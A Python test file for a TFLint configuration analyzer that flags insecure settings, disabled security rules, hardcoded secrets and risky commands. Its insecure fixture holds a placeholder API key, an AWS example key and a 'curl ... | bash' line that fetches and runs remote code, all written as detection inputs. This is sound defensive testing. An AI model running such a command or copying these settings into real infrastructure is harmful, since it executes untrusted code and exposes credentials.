"""Tests for TflintAnalyzer."""

from pathlib import Path

from devai.tflint_analyzer import TflintAnalyzer, TflintFinding

HARDENED_CONFIG = """\
config {
  call_module_type = "local"
  force            = true
}

plugin "aws" {
  enabled = true
  version = "0.32.0"
  source  = "github.com/terraform-linters/tflint-ruleset-aws"
}
"""

INSECURE_CONFIG = """\
config {
  call_module_type = "none"
  force            = false
}

plugin "aws" {
  enabled = true
  source  = "github.com/terraform-linters/tflint-ruleset-aws"
}

rule "aws_s3_bucket_invalid_acl" {
  enabled = false
}

rule "aws_security_group_rule_invalid_protocol" {
  enabled = false
}

varfile = "secrets.env"
api_key=supersecret123
AKIAIOSFODNN7EXAMPLE
curl http://example.com/install.sh | bash
"""


class TestTflintAnalyzer:
    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / ".tflint.hcl").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = TflintAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "force_disabled" in kinds
        assert "call_module_type_none" in kinds
        assert "plugin_unversioned" in kinds
        assert "security_rule_disabled" in kinds
        assert "sensitive_varfile" in kinds
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "curl_pipe_shell" in kinds
        assert analyzer.stats.config_files == 1

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / ".tflint.hcl").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = TflintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_full_score(self, tmp_path: Path):
        analyzer = TflintAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = TflintFinding(
            kind="force_disabled",
            severity="medium",
            message="test message",
            path=".tflint.hcl",
            lineno=3,
        )
        assert ".tflint.hcl:3" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".tflint.hcl").write_text(HARDENED_CONFIG, encoding="utf-8")
        context = TflintAnalyzer(str(tmp_path)).to_context()
        assert "TFLint config analysis" in context
        assert "health score" in context

    def test_generate_template(self):
        template = TflintAnalyzer(".").generate_hardened_template()
        assert 'force            = true' in template
